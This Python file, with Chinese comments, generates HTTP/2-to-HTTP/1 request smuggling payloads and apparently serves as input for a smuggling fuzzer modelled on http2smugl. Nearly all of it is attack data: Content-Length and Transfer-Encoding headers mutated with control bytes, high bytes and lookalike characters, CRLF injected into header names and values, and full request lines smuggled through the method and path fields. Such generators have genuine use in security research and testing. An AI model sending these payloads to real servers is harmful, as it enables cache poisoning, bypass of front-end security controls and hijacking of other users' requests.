import string
# * content-length插入unicode(0x1-0x21)
def gen_cl1():
    cl1 = []
    for i in range(0x1,0x21):
        cl1.append(["content-length","%c1"%(i)]) 
        cl1.append(["content-length","1%c"%(i)])
        cl1.append(["content-length%c"%(i),"1"])
        cl1.append(["%ccontent-length"%(i),"1"])
     
        cl1.append(["X: X%ccontent-length"%(i),"1"])
        cl1.append(["content-length", "1%cX: X"%(i)])
        cl1.append(["X: X\r%ccontent-length"%(i),"1"])
        cl1.append(["X: X%c\ncontent-length"%(i), "1"])
        cl1.append(["content-length","1\r%cX: X"%(i)])
        cl1.append(["content-length", "1%c\nX: X"%(i)])

        cl1.append(["%ccontent-length%c"%(i,i), "1"])
        cl1.append(["%ccontent-length"%(i),"%c1"%(i)])
        cl1.append(["%ccontent-length"%(i),"1%c"%(i)])
        cl1.append(["content-length%c"%(i),"%c1"%(i)])
        cl1.append(["content-length%c"%(i), "1%c"%(i)])
        cl1.append(["content-length","%c1%c"%(i,i)])
        
        # "-"to"_"
        cl1.append(["content_length","%c1"%(i)]) 
        cl1.append(["content_length","1%c"%(i)])
        cl1.append(["content_length%c"%(i),"1"])
        cl1.append(["%ccontent_length"%(i),"1"])
     
        cl1.append(["X: X%ccontent_length"%(i),"1"])
        cl1.append(["content_length", "1%cX: X"%(i)])
        cl1.append(["X: X\r%ccontent_length"%(i),"1"])
        cl1.append(["X: X%c\ncontent_length"%(i), "1"])
        cl1.append(["content_length","1\r%cX: X"%(i)])
        cl1.append(["content_length", "1%c\nX: X"%(i)])

        cl1.append(["%ccontent_length%c"%(i,i), "1"])
        cl1.append(["%ccontent_length"%(i),"%c1"%(i)])
        cl1.append(["%ccontent_length"%(i),"1%c"%(i)])
        cl1.append(["content_length%c"%(i),"%c1"%(i)])
        cl1.append(["content_length%c"%(i), "1%c"%(i)])
        cl1.append(["content_length","%c1%c"%(i,i)])
    return cl1

# * content-length插入unicode(0x7F,0x100)
def gen_cl2():
    cl2 = []
    for i in range(0x7F,0x100):
        cl2.append(["content-length","%c1"%(i)]) 
        cl2.append(["content-length","1%c"%(i)])
        cl2.append(["content-length%c"%(i),"1"])
        cl2.append(["%ccontent-length"%(i),"1"])

        cl2.append(["X: X%ccontent-length"%(i),"1"])
        cl2.append(["content-length", "1%cX: X"%(i)])
        cl2.append(["X: X\r%ccontent-length"%(i),"1"])
        cl2.append(["X: X%c\ncontent-length"%(i), "1"])
        cl2.append(["content-length","1\r%cX: X"%(i)])
        cl2.append(["content-length", "1%c\nX: X"%(i)])

        cl2.append(["%ccontent-length%c"%(i,i), "1"])
        cl2.append(["%ccontent-length"%(i),"%c1"%(i)])
        cl2.append(["%ccontent-length"%(i),"1%c"%(i)])
        cl2.append(["content-length%c"%(i),"%c1"%(i)])
        cl2.append(["content-length%c"%(i), "1%c"%(i)])
        cl2.append(["content-length","%c1%c"%(i,i)])

        # "-"to"_"
        cl2.append(["content_length","%c1"%(i)]) 
        cl2.append(["content_length","1%c"%(i)])
        cl2.append(["content_length%c"%(i),"1"])
        cl2.append(["%ccontent_length"%(i),"1"])
     
        cl2.append(["X: X%ccontent_length"%(i),"1"])
        cl2.append(["content_length", "1%cX: X"%(i)])
        cl2.append(["X: X\r%ccontent_length"%(i),"1"])
        cl2.append(["X: X%c\ncontent_length"%(i), "1"])
        cl2.append(["content_length","1\r%cX: X"%(i)])
        cl2.append(["content_length", "1%c\nX: X"%(i)])

        cl2.append(["%ccontent_length%c"%(i,i), "1"])
        cl2.append(["%ccontent_length"%(i),"%c1"%(i)])
        cl2.append(["%ccontent_length"%(i),"1%c"%(i)])
        cl2.append(["content_length%c"%(i),"%c1"%(i)])
        cl2.append(["content_length%c"%(i), "1%c"%(i)])
        cl2.append(["content_length","%c1%c"%(i,i)])
    return cl2
def gen_cl3():
    cl3 = []
    for i in range(3): ###########决定了请求的数量
    #     temp = []
    #     temp.append([str(i),"h\u00be"])
    #     for word in string.ascii_lowercase:
    #         for num in range(1):
    #             temp.append([word+str(num),"h\u00be"])

        # cl3.append([["date","1234"]])
        cl3.append([["a","a"]])#["c","h\u00be"]])
                    # ["d","h\u00be"],["e","h\u00be"],
                    # ["f","h\u00be"],["g","h\u00be"],
                    # ["h","h\u00be"],["i","h\u00be"]])
                    # ["j","h\u00be"],["k","h\u00be"],
                    # ["l","h\u00be"],["m","h\u00be"],
                    # ["n","h\u00be"],["o","h\u00be"],
                    # ["p","h\u00be"],["q","h\u00be"]])
                    # ["r","h\u00be"],["s","h\u00be"]])
        #             ["t","h\u00be"],["u","h\u00be"],
        #             ["v","h\u00be"],["w","h\u00be"],
        #             ["x","h\u00be"],["y","h\u00be"],
        #             ["x","h\u00be"],["y","h\u00be"],
        #             ["z","h\u00be"],["a1","h\u00be"],
        #             ["a2","h\u00be"],["a3","h\u00be"],
        #             ["a4","h\u00be"],["a5","h\u00be"],
        #             ["a6","h\u00be"],["a7","h\u00be"],
        #             ["a8","h\u00be"],["a9","h\u00be"],
        #             ["b1","h\u00be"],["b2","h\u00be"],
        #             ["b3","h\u00be"],["b4","h\u00be"],
        #             ["b5","h\u00be"],["b6","h\u00be"],
        #             ["b7","h\u00be"],["b8","h\u00be"],
        #             ["b9","h\u00be"],["c1","h\u00be"],
        #             ["c2","h\u00be"],["c3","h\u00be"],
        #             ["c4","h\u00be"],["c5","h\u00be"],
        #             ["c6","h\u00be"],["c7","h\u00be"],
        #             ["c8","h\u00be"],["c9","h\u00be"],
        #             ["d1","h\u00be"],["d2","h\u00be"],
        #             ["d3","h\u00be"],["d4","h\u00be"],
        #             ["d5","h\u00be"],["d6","h\u00be"],
        #             ["d7","h\u00be"],["d8","h\u00be"],
        #             ["d9","h\u00be"],["e1","h\u00be"],
        #             ["e2","h\u00be"],["e3","h\u00be"],
        #             ["e4","h\u00be"],["e5","h\u00be"],
        #             ["e6","h\u00be"],["e7","h\u00be"],
        #             ["e8","h\u00be"],["e9","h\u00be"],
        #             ["f1","h\u00be"],["f2","h\u00be"],
        #             ["f3","h\u00be"],["f4","h\u00be"],
        #             ["f5","h\u00be"],["f6","h\u00be"],
        #             ["f7","h\u00be"],["f8","h\u00be"],
        #             ["f9","h\u00be"],["g1","h\u00be"],
        #             ["g2","h\u00be"],["g3","h\u00be"],
        #             ["g4","h\u00be"],["g5","h\u00be"],
        #             ["g6","h\u00be"],["g7","h\u00be"],
        #             ["g8","h\u00be"],["g9","h\u00be"],
        #             ["h1","h\u00be"],["h2","h\u00be"],
        #             ["h3","h\u00be"],["h4","h\u00be"],
        #             ["h5","h\u00be"],["h6","h\u00be"],
        #             ["h7","h\u00be"],["h8","h\u00be"],
        #             ["h9","h\u00be"],["i1","h\u00be"],
        #             ["i2","h\u00be"],["i3","h\u00be"],
        #             ["i4","h\u00be"],["i5","h\u00be"],
        #             ["i6","h\u00be"],["i7","h\u00be"],
        #             ["i8","h\u00be"],["i9","h\u00be"],
        #             ["j1","h\u00be"],["j2","h\u00be"],
        #             ["j3","h\u00be"],["j4","h\u00be"],
        #             ["j5","h\u00be"],["j6","h\u00be"],
        #             ["j7","h\u00be"],["j8","h\u00be"],
        #             ["j9","h\u00be"],["k1","h\u00be"],
        #             ["k2","h\u00be"],["k3","h\u00be"],
        #             ["k4","h\u00be"],["k5","h\u00be"],
        #             ["k6","h\u00be"],["k7","h\u00be"],
        #             ["k8","h\u00be"],["k9","h\u00be"],
        #             ["l1","h\u00be"],["l2","h\u00be"],
        #             ["l3","h\u00be"],["l4","h\u00be"],
        #             ["l5","h\u00be"],["l6","h\u00be"],
        #             ["l7","h\u00be"],["l8","h\u00be"],
        #             ["j9","h\u00be"],["k1","h\u00be"],
        #             ["k2","h\u00be"],["k3","h\u00be"],
        #             ["k4","h\u00be"],["k5","h\u00be"],
        #             ["k6","h\u00be"],["k7","h\u00be"],
        #             ["k8","h\u00be"],["k9","h\u00be"],
        #             ["l1","h\u00be"],["l2","h\u00be"],
        #             ["l3","h\u00be"],["l4","h\u00be"],
        #             ["l5","h\u00be"],["l6","h\u00be"],
        #             ["l7","h\u00be"],["l8","h\u00be"],
        #             ["l9","h\u00be"],["m1","h\u00be"],
        #             ["m2","h\u00be"],["m3","h\u00be"],
        #             ["m4","h\u00be"],["m5","h\u00be"],
        #             ["m6","h\u00be"],["m7","h\u00be"],
        #             ["m8","h\u00be"],["m9","h\u00be"],
        #             ["n1","h\u00be"],["n2","h\u00be"],
        #             ["n3","h\u00be"],["n4","h\u00be"],
        #             ["n5","h\u00be"],["n6","h\u00be"],
        #             ["n7","h\u00be"],["n8","h\u00be"]
        #             ])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u00be"])
    # cl3.append(["user-agent","test\u5b63\u0165"])
    # cl3.append(["user-agent","test\u005c\u0166"])
    # cl3.append(["user-agent","test\u005c\u0263"])
    # cl3.append(["user-agent","test\u005c\u0363"])
    # cl3.append(["user-agent","test\u005c\u0463"])
    # cl3.append(["user-agent","test\u005c\u0563"])
    # cl3.append(["user-agent","test\u005c\u1063"])
    # cl3.append(["user-agent","test\u005c\u1163"])
    # cl3.append(["user-agent","test\u005c\u1263"]) 
    # cl3.append(["user-agent","test\u005c\u0163"])
    # cl3.append(["user-agent","test\u005c\u0163"])
    # cl3.append(["user-agent","test\u005c\u0163"])
    # cl3.append(["user-agent","test\u005c\u0163"])
    # cl3.append(["user-agent","test\u005c\u0163"])
    # cl3.append(["user-agent","test\u005c\u0163"])

    return cl3
# * Transfer-Encoding插入unicode(0x1-0x21)
def gen_te1():
    te1 = []
    for i in range(0x1,0x21):
        # cl1.append(["content-length","%c1"%(i)]) 
        te1.append(["%cTransfer-Encoding"%(i),"chunked"])
        te1.append(["Transfer-Encoding%c"%(i),"chunked"])
        te1.append(["Transfer-Encoding","%cchunked"%(i)])
        te1.append(["Transfer-Encoding","chunked%c"%(i)])

        te1.append(["X: X%cTransfer-Encoding"%(i),"chunked"])
        te1.append(["Transfer-Encoding","chunked%cX: X"%(i)])
        te1.append(["X: X\r%cTransfer-Encoding"%(i),"chunked"])
        te1.append(["X: X%c\nTransfer-Encoding"%(i),"chunked"])
        te1.append(["Transfer-Encoding", "chunked\r%cX: X"%(i)])
        te1.append(["Transfer-Encoding", "chunked%c\nX: X"%(i)])

        te1.append(["%cTransfer-Encoding%c"%(i,i),"chunked"])
        te1.append(["%cTransfer-Encoding"%(i),"%cchunked"%(i)])
        te1.append(["%cTransfer-Encoding"%(i),"chunked%c"%(i)])
        te1.append(["Transfer-Encoding%c"%(i),"%cchunked"%(i)])
        te1.append(["Transfer-Encoding%c"%(i),"chunked%c"%(i)])
        te1.append(["Transfer-Encoding","%cchunked%c"%(i,i)])

        # "-"to"_"
        te1.append(["%cTransfer_Encoding"%(i),"chunked"])
        te1.append(["Transfer_Encoding%c"%(i),"chunked"])
        te1.append(["Transfer_Encoding","%cchunked"%(i)])
        te1.append(["Transfer_Encoding","chunked%c"%(i)])

        te1.append(["X: X%cTransfer_Encoding"%(i),"chunked"])
        te1.append(["Transfer_Encoding","chunked%cX: X"%(i)])
        te1.append(["X: X\r%cTransfer_Encoding"%(i),"chunked"])
        te1.append(["X: X%c\nTransfer_Encoding"%(i),"chunked"])
        te1.append(["Transfer_Encoding", "chunked\r%cX: X"%(i)])
        te1.append(["Transfer_Encoding", "chunked%c\nX: X"%(i)])

        te1.append(["%cTransfer_Encoding%c"%(i,i),"chunked"])
        te1.append(["%cTransfer_Encoding"%(i),"%cchunked"%(i)])
        te1.append(["%cTransfer_Encoding"%(i),"chunked%c"%(i)])
        te1.append(["Transfer_Encoding%c"%(i),"%cchunked"%(i)])
        te1.append(["Transfer_Encoding%c"%(i),"chunked%c"%(i)])
        te1.append(["Transfer_Encoding","%cchunked%c"%(i,i)])
    return te1

# * Transfer-Encoding插入unicode(0x7F,0x100)
def gen_te2():
    te2 = []
    for i in range(0x7F,0x100):
        te2.append(["%cTransfer-Encoding"%(i),"chunked"])
        te2.append(["Transfer-Encoding%c"%(i),"chunked"])
        te2.append(["Transfer-Encoding","%cchunked"%(i)])
        te2.append(["Transfer-Encoding","chunked%c"%(i)])

        te2.append(["X: X%cTransfer-Encoding"%(i),"chunked"])
        te2.append(["Transfer-Encoding","chunked%cX: X"%(i)])
        te2.append(["X: X\r%cTransfer-Encoding"%(i),"chunked"])
        te2.append(["X: X%c\nTransfer-Encoding"%(i),"chunked"])
        te2.append(["Transfer-Encoding", "chunked\r%cX: X"%(i)])
        te2.append(["Transfer-Encoding", "chunked%c\nX: X"%(i)])

        te2.append(["%cTransfer-Encoding%c"%(i,i),"chunked"])
        te2.append(["%cTransfer-Encoding"%(i),"%cchunked"%(i)])
        te2.append(["%cTransfer-Encoding"%(i),"chunked%c"%(i)])
        te2.append(["Transfer-Encoding%c"%(i),"%cchunked"%(i)])
        te2.append(["Transfer-Encoding%c"%(i),"chunked%c"%(i)])
        te2.append(["Transfer-Encoding","%cchunked%c"%(i,i)])
        # "-"to"_"

        te2.append(["%cTransfer_Encoding"%(i),"chunked"])
        te2.append(["Transfer_Encoding%c"%(i),"chunked"])
        te2.append(["Transfer_Encoding","%cchunked"%(i)])
        te2.append(["Transfer_Encoding","chunked%c"%(i)])

        te2.append(["X: X%cTransfer_Encoding"%(i),"chunked"])
        te2.append(["Transfer_Encoding","chunked%cX: X"%(i)])
        te2.append(["X: X\r%cTransfer_Encoding"%(i),"chunked"])
        te2.append(["X: X%c\nTransfer_Encoding"%(i),"chunked"])
        te2.append(["Transfer_Encoding", "chunked\r%cX: X"%(i)])
        te2.append(["Transfer_Encoding", "chunked%c\nX: X"%(i)])

        te2.append(["%cTransfer_Encoding%c"%(i,i),"chunked"])
        te2.append(["%cTransfer_Encoding"%(i),"%cchunked"%(i)])
        te2.append(["%cTransfer_Encoding"%(i),"chunked%c"%(i)])
        te2.append(["Transfer_Encoding%c"%(i),"%cchunked"%(i)])
        te2.append(["Transfer_Encoding%c"%(i),"chunked%c"%(i)])
        te2.append(["Transfer_Encoding","%cchunked%c"%(i,i)])
    return te2

# *将"Transfer-Encoding: chunked"中的"s"替换为"\u017f"或"k"替换为"\u212a"
def gen_te3():
    te3=[]
    te3.append(["Tran\u017ffer-Encoding","chunked"])
    te3.append(["Transfer-Encoding","chun\u212aed"])
    te3.append(["Transfer-Encoding","chunked"])
    te3.append(["transfer-encoding","chunked"])
    return te3


        
# *在header value利用"\r\n" "\r" "\n"的插入header
# *有两种形式
# *一种直接插入"X:x" "X: x"
# *另一种插入"X:-00000000x" "X:000000x" "X: -00000000x" "X: 000000x"(不知道插入10个0有什么用但是http2smugl试了这种办法)
def gen_header_value_newline_inject_payload():
    header_value_newline_inject_list = [["foo","bar\r\nX:x"],["foo","bar\rX:x"],["foo","bar\nX:x"],
    ["foo","bar\r\nX: x"],["foo","bar\rX: x"],["foo","bar\nX: x"],
    ["foo","bar\r\nX:-00000000000x"],["foo","bar\rX:-00000000000x"],["foo","bar\nX:-00000000000x"],
    ["foo","bar\r\nX: -00000000000x"],["foo","bar\rX: -00000000000x"],["foo","bar\nX: -00000000000x"],
    ["foo","bar\r\nX:00000000000x"],["foo","bar\rX:00000000000x"],["foo","bar\nX:00000000000x"],
    ["foo","bar\r\nX: 00000000000x"],["foo","bar\rX: 00000000000x"],["foo","bar\nX: 00000000000x"]]
    return header_value_newline_inject_list

# *在header name利用"\r\n" "\r" "\n"的插入header
def gen_header_name_newline_inject_payload():
    header_name_newline_inject_list = [["X:x\r\nfoo","bar"],["X:x\rfoo","bar"],["X:x\nfoo","bar"],
                                    ["X: x\r\nfoo","bar"],["X: x\rfoo","bar"],["X: x\nfoo","bar"]]
    return header_name_newline_inject_list

# *header name带前空格的有毒header 转换成HTTP/1之后会折叠
def gen_poison_header_inject_payload():
    poison_header_list = [[" posion", "x"],["\x00posion", "x"],["\tposion", "x"], 
                          ["\vposion", "x"],["\u0085posion", "x"],["\u00A0posion", "x"],["\U000130BAposion", "x"]]
    return poison_header_list

# * 通过scheme字段注入url前缀
def gen_scheme_inject_payload():
    scheme_inject_list = ["http://a.example.com?", "https://a.example.com?"]
    return scheme_inject_list

# *通过method字段注入请求行
def gen_method_inject_payload():
    method_inject_list = ["GET / HTTP/1.1\r\nTransfer-encoding:chunked\r\nx:x","GET / HTTP/1.1\rTransfer-encoding:chunked\rx:x","GET / HTTP/1.1\nTransfer-encoding:chunked\nx:x",
                                                 "GET / HTTP/1.1\r\nTransfer-encoding: chunked\r\nx: x","GET / HTTP/1.1\rTransfer-encoding: chunked\rx: x","GET / HTTP/1.1\nTransfer-encoding: chunked\nx: x"]
    return method_inject_list

# *通过path字段注入请求行
def gen_path_inject_patload():
    path_inject_list = ["/ HTTP/1.1\r\nHost:127.0.0.1\r\n\r\nGET / HTTP/1.1\r\nx:x","/ HTTP/1.1\rHost:127.0.0.1\r\rGET / HTTP/1.1\rx:x","/ HTTP/1.1\nHost:127.0.0.1\n\nGET / HTTP/1.1\nx:x",
                        "/ HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\nGET / HTTP/1.1\r\nx: x","/ HTTP/1.1\rHost: 127.0.0.1\r\rGET / HTTP/1.1\rx: x","/ HTTP/1.1\nHost: 127.0.0.1\n\nGET / HTTP/1.1\nx: x"]
    return path_inject_list


# *所有Transfer-encoding插入unicode
def gen_all_te():
    te = []
    te.extend(gen_te1())
    te.extend(gen_te2())
    te.extend(gen_te3())
    return te

# *所有content-length插入unicode
def gen_all_cl():
    cl = []
    cl.extend(gen_cl3())
    # cl.extend(gen_cl1())
    # cl.extend(gen_cl2())

    return cl
if __name__ == "__main__":
    print("test")